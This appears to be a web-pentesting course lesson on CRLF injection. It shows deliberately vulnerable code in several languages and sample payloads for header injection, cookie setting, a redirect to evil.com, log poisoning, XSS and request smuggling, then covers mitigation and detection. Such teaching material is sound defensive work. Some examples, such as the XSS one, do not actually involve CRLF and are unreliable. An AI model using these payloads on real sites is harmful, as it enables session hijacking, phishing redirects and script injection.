# Carriage Return Line Feed (CRLF) Injection

## What you will learn in this course üßêüßê

- Understand the concept of CRLF Injection
- Learn how to exploit CRLF Injection vulnerabilities

CRLF (Carriage Return Line Feed) injections are typically discussed in the context of security vulnerabilities, but there are legitimate scenarios where CRLF sequences are used in web applications for valid purposes. CRLF refers to the combination of carriage return (`\r`) and line feed (`\n`) characters, which are used to signify the end of a line in text files and HTTP headers. Here‚Äôs a breakdown of legitimate uses:

## Where is CRLF used ?

### HTTP Header Construction

When building HTTP headers programmatically, it‚Äôs essential to include CRLF sequences to separate header fields and denote the end of the header section. For example, when generating HTTP responses or requests, you need to format the headers correctly using CRLF to comply with the HTTP specification. Here‚Äôs an example of a properly formatted HTTP header:

```
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Content-Length: 123\r\n
\r\n
<html>...</html>
```

### Email Headers

In web applications that handle email functionalities, CRLF sequences are used to format email headers according to the standards of the Simple Mail Transfer Protocol (SMTP). For instance, email headers need to be separated by CRLF sequences to ensure proper formatting and deliverability:

```
From: sender@example.com\r\n
To: recipient@example.com\r\n
Subject: Test Email\r\n
\r\n
This is the body of the email.
```

### Log File Management

CRLF sequences are used in log files to separate log entries and improve readability. In applications that generate log files for monitoring and debugging, CRLF characters help format the log entries neatly:

```
[2024-08-20 12:00:00] INFO: User login successful\r\n
[2024-08-20 12:05:00] ERROR: Database connection failed\r\n
```

### Generating Downloadable Files

When creating text files for download (such as CSV or plain text files), CRLF sequences are used to separate lines in the file. This ensures that the downloaded files are properly formatted and readable in different text editors:

```
Name, Age, Email\r\n
John Doe, 30, john@example.com\r\n
Jane Smith, 25, jane@example.com\r\n
```

### Cross-Platform Compatibility

Different operating systems use different conventions for line endings (e.g., `\n` for Unix/Linux and `\r\n` for Windows). When developing cross-platform applications, using CRLF can ensure compatibility with Windows-based systems that expect this format.

## Description of Injection

**CRLF Injection** is a type of security vulnerability that occurs when an attacker is able to insert carriage return (`\r`) and line feed (`\n`) characters into an application‚Äôs input or output. These characters are used to denote line breaks in text files and HTTP headers, and their injection can lead to various attacks, including HTTP response splitting, log poisoning, and header injection.

### How CRLF Injection Works

- **Carriage Return and Line Feed:** CRLF stands for Carriage Return (`\r`) and Line Feed (`\n`). In text and HTTP protocols, these characters are used to signify the end of a line.

- **Injection Mechanism:** When an application fails to properly sanitize or validate user input, an attacker can include CRLF characters in their input. If this input is processed by the application and used in HTTP headers, log files, or other critical sections, it can alter the formatting or introduce unexpected behavior.

## Exploitation

CRLF (Carriage Return Line Feed) Injection attacks are typically found on web servers and applications where user input is incorporated into HTTP headers or responses without proper sanitization. These attacks exploit vulnerabilities in how user input is processed and included in HTTP responses. Here's how CRLF Injection can manifest in various types of web servers:

### Web Server Environments Susceptible to CRLF Injection

#### PHP-Based Servers

PHP applications are particularly prone to CRLF Injection if they include user input in HTTP headers or responses without adequate sanitization. In PHP, headers can be manipulated if user input is used directly in functions such as `header()` or `setcookie()`. For example:

```php
// Vulnerable PHP code
$userInput = $_GET['user_input'];
header("X-Custom-Header: $userInput");
```

If an attacker provides input like `foo\r\nSet-Cookie: malicious=value`, it can manipulate the header or set additional cookies, leading to potential response splitting or other malicious actions.

#### JavaScript/Node.js Servers

Node.js applications can also be vulnerable to CRLF Injection if they do not properly sanitize user inputs when constructing HTTP responses. For instance, using user input directly in response headers without validation can lead to vulnerabilities:

```javascript
// Vulnerable Node.js code
const http = require("http");
const server = http.createServer((req, res) => {
  const userInput = req.url.split("?user_input=")[1];
  res.setHeader("X-Custom-Header", userInput);
  res.end("Response");
});
```

An attacker could manipulate the `user_input` parameter to inject CRLF characters, leading to unwanted header modifications or response splitting.

#### Java Servlets and Other Frameworks

Web servers running Java Servlets or similar frameworks can be susceptible to CRLF Injection if user input is used directly in HTTP headers. For example, in a Java Servlet:

```java
// Vulnerable Java Servlet code
String userInput = request.getParameter("user_input");
response.setHeader("X-Custom-Header", userInput);
```

An attacker providing input like `foo\r\nSet-Cookie: malicious=value` could manipulate response headers, potentially leading to session hijacking or other issues.

#### ASP.NET and Other Frameworks

ASP.NET applications might be vulnerable if user inputs are included in HTTP responses or headers without proper validation. For instance:

```csharp
// Vulnerable ASP.NET code
string userInput = Request.QueryString["user_input"];
Response.Headers.Add("X-Custom-Header", userInput);
```

Malicious input could lead to CRLF Injection, altering headers or injecting content into the response.

### Common Exploitation Scenarios

#### HTTP Response Splitting

Attackers can inject CRLF sequences into HTTP headers or responses. This can cause the server to send multiple HTTP responses to the client. For example, an attacker could inject headers into a response, causing the server to send additional headers or content that could manipulate how the client processes the response.

**Example:**

```http
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
X-Special-Header: injected\r\n
\r\n
<html>Injected content here</html>
```

The injected header (`X-Special-Header: injected`) can be interpreted by the client, potentially affecting how the response is handled.

#### Log Poisoning:

CRLF injection can be used to manipulate log files by injecting additional lines. This can lead to misleading logs, data manipulation, or even hide malicious activities.

**Example:**

```
User Input: malicious-input\r\nAnother-Header: injected
```

The log entry might look like:

```
2024-08-20 12:00:00 User Input: malicious-input
Another-Header: injected
```

#### Header Injection

If an attacker can inject CRLF sequences into HTTP headers, they might add or modify headers in a way that could affect the application‚Äôs behavior or security.

**Example:**

```
HTTP/1.1 200 OK\r\n
Set-Cookie: sessionId=12345\r\n
\r\n
```

If an attacker injects additional headers, it might lead to unexpected behavior or security issues.

Here is an example of how a typical CRLF Injection should happen :

1. The attacker inputs data containing CRLF characters.

2. The web application processes this input and includes it in HTTP headers.

3. This can lead to HTTP response splitting or other header manipulations.

![CRLF](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D04-Web_Pentesting_01/01-lectures/CRLF.png)

## Advanced Techniques for Exploiting CRLF Injection

CRLF (Carriage Return Line Feed) injection is a versatile attack vector that can exploit vulnerabilities in the way an application handles line breaks. Here‚Äôs a detailed look at various techniques used to exploit CRLF injection, including examples of vulnerable code and corresponding attack vectors.

### HTTP Response Splitting

#### Injecting Headers

**Description**: By inserting CRLF characters into HTTP headers, an attacker can create additional headers or modify existing ones, leading to HTTP response splitting. This can be used to inject arbitrary headers, which might facilitate attacks like Cross-Site Scripting (XSS).

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable code that uses user input directly in headers
$user_input = $_GET['input'];
header("X-Custom-Header: " . $user_input);
?>
```

**Example of Malicious Input**:

```
malicious_value\r\nX-Injected-Header: injected_value
```

**Resulting HTTP Request**:

```
GET /vulnerable_script.php?input=malicious_value%0D%0AX-Injected-Header:%20injected_value HTTP/1.1
Host: example.com
```

This request could lead to the following HTTP response:

```
HTTP/1.1 200 OK
X-Custom-Header: malicious_value
X-Injected-Header: injected_value

<html>...</html>
```

#### Redirects

**Description**: CRLF injection can also be used to insert a `Location` header, causing the server to redirect users to a malicious site.

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable redirect based on user input
$url = $_GET['url'];
header("Location: " . $url);
?>
```

**Example of Malicious Input**:

```
http://example.com/malicious_page\r\nLocation: http://evil.com
```

**Resulting HTTP Request**:

```
GET /vulnerable_redirect.php?url=http://example.com/malicious_page%0D%0ALocation:%20http://evil.com HTTP/1.1
Host: example.com
```

This could lead to the following HTTP response:

```
HTTP/1.1 302 Found
Location: http://evil.com

```

### Log File Manipulation

**Description**: CRLF sequences can be injected into log files to manipulate log entries, which can be used to obscure malicious activities or insert fake log entries.

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable logging that includes user input directly
$user_input = $_GET['user_input'];
error_log("User Input: " . $user_input);
?>
```

**Example of Malicious Input**:

```
malicious_data\r\nInjected: fake_entry
```

**Resulting Log Entry**:

```
User Input: malicious_data
Injected: fake_entry
```

This can obscure the actual log content and insert misleading entries.

### XSS via CRLF Injection

**Description**: By injecting CRLF sequences followed by a `<script>` tag, an attacker can execute scripts in the context of the victim‚Äôs browser, leading to Cross-Site Scripting (XSS) attacks.

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable script rendering
echo $_GET['content'];
?>
```

**Example of Malicious Input**:

```
<script>alert('XSS');</script>\r\n
```

**Resulting HTML Output**:

```html
<script>
  alert("XSS");
</script>
```

The injected script will execute in the user's browser, leading to an XSS attack.

### HTTP Header Injection

#### Header Manipulation

**Description**: CRLF injection can be used to insert or manipulate HTTP headers, potentially bypassing security mechanisms or affecting how headers are processed.

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable header setting
header($_GET['header']);
?>
```

**Example of Malicious Input**:

```
X-Injected-Header: injected_value\r\nSet-Cookie: session_id=malicious
```

**Resulting HTTP Request**:

```
GET /vulnerable_header.php?header=X-Injected-Header:%20injected_value%0D%0ASet-Cookie:%20session_id=malicious HTTP/1.1
Host: example.com
```

This request might result in:

```
HTTP/1.1 200 OK
X-Injected-Header: injected_value
Set-Cookie: session_id=malicious
```

#### SSRF and Request Injection

**Description**: Exploiting CRLF injection to craft and insert new HTTP requests can lead to Server-Side Request Forgery (SSRF) or other unauthorized actions.

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable code making HTTP requests based on user input
$url = $_GET['url'];
$response = file_get_contents($url);
?>
```

**Example of Malicious Input**:

```
http://example.com/malicious\r\nHost: vulnerable.com
```

**Resulting Request**:

```
GET /vulnerable_request.php?url=http://example.com/malicious%0D%0AHost:%20vulnerable.com HTTP/1.1
Host: example.com
```

This request could potentially trick the server into making unauthorized requests.

### Request Smuggling

**Description**: CRLF injection can be used to manipulate the response queue, potentially leading to HTTP request smuggling and other exploits.

**Example of Vulnerable Code**:

```php
<?php
// Vulnerable response construction
header("Content-Length: " . strlen($_GET['content']));
echo $_GET['content'];
?>
```

**Example of Malicious Input**:

```
normal_content\r\n\r\nmalicious_content
```

**Resulting Request**:

```
GET /vulnerable_response.php?content=normal_content%0D%0A%0D%0Amalicious_content HTTP/1.1
Host: example.com
```

This could result in two responses being processed by the client or intermediary, potentially leading to request smuggling.

### Mitigation Techniques

To mitigate CRLF Injection vulnerabilities, ensure thorough input validation and sanitization. Strip or encode CRLF characters (`\r` and `\n`) from user input before including it in HTTP headers or responses. Use libraries or frameworks that automatically handle header encoding and prevent injection attacks. Implement content security policies (CSP) to reduce the impact of any injected scripts. Additionally, avoid reflecting user input in HTTP headers whenever possible and use a whitelist approach to allow only known safe inputs.

- **Sanitize Inputs**: Ensure that user inputs do not contain unintended CRLF sequences that could manipulate HTTP headers or log file formats.
- **Validate and Escape Outputs**: Properly escape or encode any data that is included in HTTP headers or other sensitive outputs to prevent injection attacks.
- **Use Security Libraries**: Utilize well-tested libraries and frameworks for handling HTTP requests, email headers, and file formatting to avoid manual errors and vulnerabilities.

### Detection Techniques

For detecting CRLF Injection vulnerabilities, review the application code for any instances where user input is directly used in HTTP headers or responses without proper sanitization. Conduct regular security audits and penetration testing to identify potential injection points. Monitor server logs for unusual header values or patterns indicative of CRLF Injection attempts. Use automated security scanning tools to detect common CRLF Injection vectors and misconfigurations. Additionally, analyze HTTP responses for anomalies that could indicate response splitting or header manipulation.

## Resources

- [OWASP CRLF](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [Invicti CRLF Injection](https://www.invicti.com/learn/crlf-injection/)
